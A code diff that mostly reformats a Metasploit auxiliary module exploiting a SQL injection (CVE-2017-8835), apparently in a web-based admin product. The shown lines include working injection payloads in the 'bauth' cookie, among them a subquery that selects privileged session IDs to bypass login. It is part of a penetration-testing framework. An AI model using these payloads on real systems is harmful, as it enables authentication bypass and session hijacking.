@@ -15,21 +15,24 @@ class MetasploitModule < Msf::Auxiliary
           By default, a session expires 4 hours after login (the setting can be changed by the admin), for this
           reason, the module attempts to retrieve the most recently created sessions.
         },
-        'Author' =>
-          [
-            'X41 D-Sec GmbH <info@x41-dsec.de>', # Original Advisory
-            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
-          ],
+        'Author' => [
+          'X41 D-Sec GmbH <info@x41-dsec.de>', # Original Advisory
+          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
+        ],
         'License' => MSF_LICENSE,
         'Platform' => %w[linux],
-        'References' =>
-          [
-            [ 'EDB', '42130' ],
-            [ 'CVE', '2017-8835' ],
-            [ 'URL', 'https://gist.github.com/red0xff/c4511d2f427efcb8b018534704e9607a' ]
-          ],
+        'References' => [
+          [ 'EDB', '42130' ],
+          [ 'CVE', '2017-8835' ],
+          [ 'URL', 'https://gist.github.com/red0xff/c4511d2f427efcb8b018534704e9607a' ]
+        ],
         'Targets' => [['Wildcard Target', {}]],
-        'DefaultTarget' => 0
+        'DefaultTarget' => 0,
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
     register_options(
@@ -45,7 +48,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def perform_sqli
-    # Note: using run_sql because there is a limit on the length of our queries
+    # NOTE: using run_sql because there is a limit on the length of our queries
     # will work only if we remove the casts, NULL value handling etc.
     digit_range = ('0'..'9')
     bit_range = ('0'..'1')
@@ -178,7 +181,7 @@ class MetasploitModule < Msf::Auxiliary
       elsif node.is_a?(Nokogiri::XML::Element)
         node_name = node.name
         if node.attributes && !node.attributes.empty?
-          node_name += ' {' + node.attributes.map { |(_n, attr)| attr.name + '=' + attr.value }.join(',') + '}'
+          node_name += " {#{node.attributes.map { |(_n, attr)| "#{attr.name}=#{attr.value}" }.join(',')}}"
         end
         vprint_good "\t" * nesting + node_name
         node.children.each do |child|
@@ -198,6 +201,7 @@ class MetasploitModule < Msf::Auxiliary
         'cookie' => "bauth=' or #{payload}--"
       })
       return Exploit::CheckCode::Unknown("Unable to connect to #{target_uri.path}") unless res
+
       res.get_cookies.empty? # no Set-Cookie header means the session cookie is valid
     end
     if @sqli.test_vulnerable
@@ -214,8 +218,10 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_good 'Target seems to be vulnerable'
     if datastore['BypassLogin']
-      cookies = [ "' or id IN (select s.id from sessions as s " \
-      "left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--"]
+      cookies = [
+        "' or id IN (select s.id from sessions as s " \
+              "left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--"
+      ]
     else
       cookies = perform_sqli
     end
